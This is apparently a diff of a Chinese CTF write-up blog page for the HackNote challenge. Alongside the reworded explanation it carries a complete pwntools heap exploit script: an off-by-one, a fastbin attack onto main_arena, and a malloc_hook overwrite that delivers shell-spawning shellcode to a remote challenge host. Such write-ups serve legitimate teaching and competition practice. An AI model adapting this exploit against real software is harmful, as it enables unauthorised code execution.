@@ -119,18 +119,18 @@
 
 
 
-  <meta name="description" content="HackNote edit的时候用了strlen,off_by_one. 堆重叠后fastbin attack,设计size分配到main_arena,修改unsort bin,再次分配修改malloc_hook到shellcode. 1234567891011121314151617181920212223242526272829303132333435363738394041424344">
+  <meta name="description" content="HackNote edit的时候用了strlen,off_by_one. 堆重叠后fastbin attack,通过劫持fd将size填充到main_arena,修改unsorted bin为malloc_hook,再次分配修改malloc_hook到shellcode. 123456789101112131415161718192021222324252627282930313233343">
 <meta name="keywords" content="Jeopardy">
 <meta property="og:type" content="article">
 <meta property="og:title" content="writeup-hxb-2019-quals">
 <meta property="og:url" content="https://hitworld.github.io/posts/1ececfa4/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="HackNote edit的时候用了strlen,off_by_one. 堆重叠后fastbin attack,设计size分配到main_arena,修改unsort bin,再次分配修改malloc_hook到shellcode. 1234567891011121314151617181920212223242526272829303132333435363738394041424344">
+<meta property="og:description" content="HackNote edit的时候用了strlen,off_by_one. 堆重叠后fastbin attack,通过劫持fd将size填充到main_arena,修改unsorted bin为malloc_hook,再次分配修改malloc_hook到shellcode. 123456789101112131415161718192021222324252627282930313233343">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-08-25T11:40:29.674Z">
+<meta property="og:updated_time" content="2020-08-26T05:14:07.086Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-hxb-2019-quals">
-<meta name="twitter:description" content="HackNote edit的时候用了strlen,off_by_one. 堆重叠后fastbin attack,设计size分配到main_arena,修改unsort bin,再次分配修改malloc_hook到shellcode. 1234567891011121314151617181920212223242526272829303132333435363738394041424344">
+<meta name="twitter:description" content="HackNote edit的时候用了strlen,off_by_one. 堆重叠后fastbin attack,通过劫持fd将size填充到main_arena,修改unsorted bin为malloc_hook,再次分配修改malloc_hook到shellcode. 123456789101112131415161718192021222324252627282930313233343">
 
 
 
@@ -532,7 +532,7 @@
       
         <h2 id="hacknote">HackNote</h2>
 <p><code>edit</code>的时候用了<code>strlen</code>,<code>off_by_one</code>.</p>
-<p>堆重叠后<code>fastbin attack</code>,设计<code>size</code>分配到<code>main_arena</code>,修改<code>unsort bin</code>,再次分配修改<code>malloc_hook</code>到<code>shellcode</code>.</p>
+<p>堆重叠后<code>fastbin attack</code>,通过劫持<code>fd</code>将<code>size</code>填充到<code>main_arena</code>,修改<code>unsorted bin</code>为<code>malloc_hook</code>,再次分配修改<code>malloc_hook</code>到<code>shellcode</code>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">malloc_hook = <span class="number">0x6CB788</span></span><br><span class="line">free_hook = <span class="number">0x6CD5E8</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(os=<span class="string">"linux"</span>, arch=<span class="string">"amd64"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Input the Size:\n"</span>, str(size))</span><br><span class="line">    r.sendafter(<span class="string">"Input the Note:\n"</span>, content)</span><br><span class="line">    r.recvuntil(<span class="string">"4. Exit\n-----------------\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Input the Index of Note:\n"</span>, str(index))</span><br><span class="line">    r.recvuntil(<span class="string">"4. Exit\n-----------------\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Input the Index of Note:\n"</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">"Input the Note:\n"</span>, content)</span><br><span class="line">    r.recvuntil(<span class="string">"4. Exit\n-----------------\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("./HackNote")</span></span><br><span class="line">r = remote(<span class="string">"183.129.189.62"</span>, <span class="string">"17104"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"4. Exit\n-----------------\n"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">"a\n"</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x200</span>, <span class="string">"a"</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x200</span>) + <span class="string">"\n"</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"a\n"</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"a\n"</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"a"</span> * <span class="number">0x108</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"a"</span> * <span class="number">0x108</span> + <span class="string">"\n"</span>)</span><br><span class="line">add(<span class="number">0xc0</span>, <span class="string">"a\n"</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">"a\n"</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"a\n"</span>)<span class="comment">#5</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">"a\n"</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"a"</span> * <span class="number">0xc8</span> + p64(<span class="number">0x60</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0</span>) * <span class="number">10</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6cb820</span>) + <span class="string">"\n"</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">"a\n"</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"a\n"</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x6CB788</span> - <span class="number">0x10</span>) + <span class="string">"\n"</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0x6cb790</span>) + asm(shellcraft.sh()) + <span class="string">"\n"</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Input the Size:\n"</span>, str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="namesystem">NameSystem</h2>
 <p>填满指针数组后可<code>double free</code>进行<code>fastbin attack</code>.</p>
@@ -661,7 +661,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">172</span>
+                    <span class="site-state-item-count">171</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -885,7 +885,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">727k</span>
+    <span title="站点总字数">705k</span>
   
 
   
@@ -894,7 +894,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">11:01</span>
+    <span title="站点阅读时长">10:41</span>
   
 </div>
 
